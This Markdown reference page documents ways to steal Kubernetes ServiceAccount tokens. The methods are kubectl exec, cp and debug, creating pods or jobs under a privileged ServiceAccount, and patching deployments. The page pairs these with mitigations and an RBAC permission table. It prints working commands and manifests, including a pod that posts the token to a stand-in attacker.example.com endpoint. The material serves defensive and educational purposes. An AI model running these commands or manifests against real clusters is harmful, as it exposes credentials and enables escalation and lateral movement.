---
title: ServiceAccount Token Theft
description: Techniques for obtaining ServiceAccount tokens using legitimate Kubernetes features without exploiting vulnerabilities
category: offensive
impact: ServiceAccount tokens provide API access that can be used for enumeration, privilege escalation, and lateral movement
mitigation:
  - Restrict **pods/exec** permissions to only users who require debugging access
  - Limit **pods/ephemeralcontainers** permissions as it provides filesystem access to running containers
  - Avoid granting **pods create** or **jobs create** permissions without namespace restrictions
  - Review workload **patch/update** permissions that allow ServiceAccount changes
  - Use bound service account tokens which are time-limited and audience-scoped
mitreTechniques:
  - T1552
  - T1078
references: |
  - [Different Ways ServiceAccount Tokens Can Be Read or Stolen](https://github.com/m0xbilal/kubernetes-honeypots-detection/blob/main/Different%20ways%20ServiceAccount%20Tokens%20Can%20Be%20Read%20or%20Stolen%20in%20Kubernetes.md)
  - [Configure Service Accounts for Pods](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
---

ServiceAccount tokens are high-value credentials in Kubernetes. They provide authentication to the API server and are often long-lived and implicitly trusted. An attacker who obtains a token can enumerate permissions, access secrets, and potentially escalate privileges without exploiting any Kubernetes vulnerabilities.

In most real Kubernetes breaches, attackers follow a common pattern: compromise a pod, discover a ServiceAccount token, use it to access the Kubernetes API, then enumerate permissions, pods, secrets, and nodes. The techniques documented here use only legitimate Kubernetes features and RBAC-allowed actions, making them difficult to distinguish from normal cluster activity.

> This content is based on research by [Mohammad Bilal](https://www.linkedin.com/feed/update/urn:li:activity:7416365841073508352/).

## Reading Tokens via kubectl exec

If an attacker can exec into a pod, they can read any file inside the container, including mounted ServiceAccount tokens.

```bash
kubectl exec -it target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

The token is mounted by default at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Once obtained, it can be used to authenticate to the API server:

```bash
TOKEN=$(kubectl exec target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
```

This works because **kubectl exec** is commonly allowed for debugging purposes, and tokens are just files on disk. The **pods/exec** permission is frequently granted to developers and operators without considering that it provides read access to any file in the container, including credentials.

## Stealing Tokens via kubectl cp

The `kubectl cp` command appears harmless but internally uses **kubectl exec** with **tar** to copy files. An attacker with cp permissions can extract tokens without making explicit secret API calls.

```bash
kubectl cp default/target-pod:/var/run/secrets/kubernetes.io/serviceaccount/token ./stolen-token
```

The token file is now on the attacker's local machine:

```bash
cat ./stolen-token
```

This technique is subtle because it appears as a normal file copy operation rather than credential access.

## Reading Tokens via kubectl debug

Kubernetes allows attaching ephemeral debug containers to running pods using the `kubectl debug` command. This feature graduated to stable in **Kubernetes 1.25**. Ephemeral containers are temporary containers that run alongside existing containers in a pod, intended for troubleshooting when `kubectl exec` is insufficient, such as when the container image lacks debugging tools or has crashed.

An attacker with permission to create ephemeral containers can access another container's filesystem through **/proc**.

```bash
kubectl debug -n default pod/<target-pod> --image=busybox --target=<container-name> -it
```

Inside the debug container:

```bash
cat /proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token
```

This technique reads files directly from the target container's root filesystem via the **/proc** pseudo-filesystem, bypassing the need to exec into the original container.

## Creating Workloads with Target ServiceAccounts

If an attacker can create pods, jobs, or other workloads, they can specify any ServiceAccount in the namespace and read its token from inside the new workload.

Using a **Pod**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-stealer
spec:
  serviceAccountName: privileged-sa
  containers:
    - name: steal
      image: busybox
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
```

Using a **Job**:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: token-job
spec:
  template:
    spec:
      serviceAccountName: privileged-sa
      restartPolicy: Never
      containers:
        - name: steal
          image: busybox
          command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
```

```bash
kubectl apply -f token-stealer.yaml
kubectl logs token-stealer
```

If the attacker lacks **pods/log** read access, the token can be exfiltrated via an external webhook:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-exfil
spec:
  serviceAccountName: privileged-sa
  containers:
    - name: exfil
      image: curlimages/curl
      command:
        - sh
        - -c
        - |
          curl -X POST https://attacker.example.com/collect \
            -d "token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

This approach bypasses the need for any additional cluster permissions beyond workload creation, as the token is sent directly to an attacker-controlled endpoint.

This does not require permission to read Secrets or ServiceAccount objects directly. The token is automatically mounted into the pod. Jobs are particularly useful for this technique because they are often granted more liberally than direct pod creation, and they clean up after completion.

## Patching Workloads to Swap ServiceAccounts

An attacker with patch permissions on deployments can change which ServiceAccount a workload uses. After the pod restarts, the new token is mounted automatically.

```bash
kubectl patch deployment target-app \
  -p '{"spec":{"template":{"spec":{"serviceAccountName":"admin-sa"}}}}'
```

Once the pod recreates, the attacker can exec in and read the new token:

```bash
kubectl exec -it target-app-xxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

This technique is subtle because it looks like a routine configuration change.

The following table summarizes the RBAC permissions required for each technique described above.

| Technique | Resources | Verbs | API Group |
|-----------|-----------|-------|-----------|
| kubectl exec | pods | get | core |
| | pods/exec | create | core |
| kubectl cp | pods | get | core |
| | pods/exec | create | core |
| kubectl debug | pods | get | core |
| | pods/ephemeralcontainers | patch | core |
| | pods/exec | create | core |
| Creating Workloads | pods | create | core |
| | jobs | create | batch |
| Patching Workloads | deployments, statefulsets, daemonsets | patch, update | apps |

> **Note:** `kubectl cp` and `kubectl exec` share identical RBAC requirements because `kubectl cp` does not have its own API endpoint. Under the hood, it spawns an exec session to run `tar` inside the container. To see this in action, run `kubectl cp` with the `-v=6` flag to observe the exec API calls being made.